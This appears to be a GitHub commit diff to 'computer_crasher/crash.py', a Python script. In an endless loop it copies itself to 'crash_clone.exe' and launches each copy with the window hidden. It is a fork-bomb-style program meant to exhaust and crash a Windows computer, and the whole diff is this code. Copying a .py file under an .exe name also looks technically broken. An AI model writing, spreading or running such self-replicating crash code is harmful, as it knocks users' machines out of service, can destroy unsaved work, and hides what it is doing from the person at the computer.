d8d56442722a9c41fae5ef740c067618d465cffc
Chirayu <114068521+ckbadgujar2003@users.noreply.github.com>
2025-02-09 20:31:50 +0530

    Update crash.py

--- computer_crasher/crash.py
+++ computer_crasher/crash.py
@@ -1,4 +1,18 @@
 import os
+import shutil
+import subprocess
+
+replica_name = "crash_clone.exe"
+
+# Get path of the current script
+current_file = os.path.abspath(__file__)
 
 while True:
-    os.startfile(__file__[:-2]+'exe')
+    # Define a new file path in the same directory
+    replica_path = os.path.join(os.getcwd(), replica_name)
+
+    # Copy the current file to the new location
+    shutil.copy(current_file, replica_path)
+
+    # Execute the newly created replica
+    subprocess.Popen(replica_path, creationflags=subprocess.CREATE_NO_WINDOW)
